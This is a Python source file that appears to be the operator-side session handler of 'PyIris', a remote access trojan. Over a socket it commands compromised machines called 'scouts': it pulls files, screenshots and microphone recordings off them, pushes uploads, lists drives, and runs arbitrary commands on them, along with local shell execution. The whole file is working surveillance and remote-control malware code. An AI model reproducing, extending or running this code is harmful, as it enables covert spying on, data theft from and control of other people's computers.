import os, socket, time, subprocess, cfg
from modules.show_banner import *
from modules.clear_screen import *
from modules.cleanup_code import *
from modules.recv_all import *
from modules.find_basename import *

cfg.global_variables()


def Pyiris_handler(id):
    global command_input
    print cfg.pos + 'Bridged to scout of ID : ' + str(cfg.db_scouts[id][0])
    prompt_handler = '\x1b[1m\x1b[37mPyIris (\x1b[0m' + '\x1b[1m\x1b[31m' + cfg.db_scouts[id][3] + '\x1b[0m' + '\x1b[1m\x1b[37m) > \x1b[0m'
    while True:
        try:
            command_input = raw_input(prompt_handler).strip()
            command = command_input.split(' ',1)[0]
            if command == 'banner':
                display_banner()
            elif command == 'quit':
                cleanup()
            elif command == 'clear':
                clear()
            elif command == 'back':
                print '\n' + cfg.pos + 'Returning...'
                return
            elif command == 'disconnect':
                cfg.db_scouts[id][5].sendall(command_input + End)
                output = recvall(cfg.db_scouts[id][5])
                print output
                cfg.db_scouts.pop(id)
                break
            elif command == 'terminate':
                cfg.db_scouts[id][5].sendall(command_input + End)
                output = recvall(cfg.db_scouts[id][5])
                print output
                cfg.db_scouts.pop(id)
                break
            elif command == 'sleep':
                cfg.db_scouts[id][5].sendall(command_input + End)
                output = recvall(cfg.db_scouts[id][5])
                print output
                if '[*]' in output:
                    cfg.db_scouts.pop(id)
                    break
            elif command == 'download':
                cfg.db_scouts[id][5].sendall(command_input + End)
                cfg.db_scouts[id][5].settimeout(3)
                output = recvall(cfg.db_scouts[id][5])
                if '|/' in output:
                    output = output.rstrip(End).split('|/', 1)
                    f = open(basename(output[0]), 'wb')
                    f.write(output[1])
                    f.close()
                    print cfg.pos + 'Downloaded file succesfully'
                else:
                    print output
            elif command == 'upload':
                try:
                    file_name = command_input.split(' ', 1)[1]
                except:
                    print cfg.err + 'Specify file to upload'
                    continue
                if os.path.isfile(file_name):
                    f = open(file_name, 'rb')
                    data = f.read()
                    f.close()
                    cfg.db_scouts[id][5].sendall('upload '+file_name + '|/' + data + End)
                    cfg.db_scouts[id][5].settimeout(None)
                    output = recvall(cfg.db_scouts[id][5])
                    print output
                else:
                    print cfg.err + 'File path/name is not valid'
            elif command == 'valids':
                cfg.db_scouts[id][5].sendall(command_input + End)
                output = recvall(cfg.db_scouts[id][5])
                if '|/' in output:
                    load_output = output.split('|/')
                    for i in load_output:
                        print cfg.note + i
            elif command == 'active':
                cfg.db_scouts[id][5].sendall(command_input + End)
                output = recvall(cfg.db_scouts[id][5])
                if '|/' in output:
                    output = output.split('|/')
                    for i in output:
                        if not i:
                            continue
                        print cfg.pos + i
                else:
                    print output
            elif command == 'drives':
                cfg.db_scouts[id][5].sendall(command_input + End)
                output = recvall(cfg.db_scouts[id][5])
                if '|/' in output:
                    output = output.split('|/')
                    for i in output:
                        print cfg.pos + i
                else:
                    print output
            elif command == 'screen':
                cfg.db_scouts[id][5].sendall(command_input + End)
                output = recvall(cfg.db_scouts[id][5])
                if '|/' in output:
                    output = output.split('|/', 1)
                    f = open(basename(output[0]), 'wb')
                    f.write(output[1])
                    f.close()
                    print cfg.pos + 'Downloaded scouts screenshot as : ' + basename(output[0])
                else:
                    print output
            elif command == 'rec_audio':
                cfg.db_scouts[id][5].sendall(command_input + End)
                print cfg.pos + 'Recording, please be patient '
                output = recvall(cfg.db_scouts[id][5])
                if '|/' in output:
                    output = output.split('|/', 1)
                    f = open(basename(output[0]), 'wb')
                    f.write(output[1])
                    f.close()
                    print cfg.pos + 'Downloaded scouts audio recording as : ' + basename(output[0])
                else:
                    print output
            elif command == 'local':
                try:
                    execute = command_input.split(' ',1)[1]
                    print '\n' + cfg.note + 'Executing on system...\n'
                except IndexError:
                    print cfg.err + 'Specify a local system command to run'
                    continue
                if execute[:3] == 'cd ':
                    try:
                        execute = execute.replace('cd ', '')
                        os.chdir(execute)
                        print cfg.pos + "Changed to directory : " + execute
                    except (WindowsError,OSError):
                        print cfg.err + 'Could not change to directory : ' + execute
                else:
                    try:
                        result = subprocess.Popen(execute, shell=True, stdout=subprocess.PIPE,
                                                  stderr=subprocess.PIPE,
                                                  stdin=subprocess.PIPE)
                        result = result.stdout.read() + result.stderr.read()
                        print result
                    except:
                        print cfg.err + 'Could not execute command'
            elif command == '':
                pass
            else:
                cfg.db_scouts[id][5].sendall(command_input + End)
                output = recvall(cfg.db_scouts[id][5])
                print output
        except EOFError:
            try:
                time.sleep(3)
            except KeyboardInterrupt:
                cleanup()
        except KeyboardInterrupt:
            cleanup()
        except socket.error as e:
            print cfg.err + 'Socket error detected : ' + str(e)
            print cfg.err + 'Stopping current session...'
            cfg.db_scouts.pop(id)
            print cfg.note + 'Returning...'
            return
        except Exception as e:
            print cfg.err + 'Error : ' + str(e)
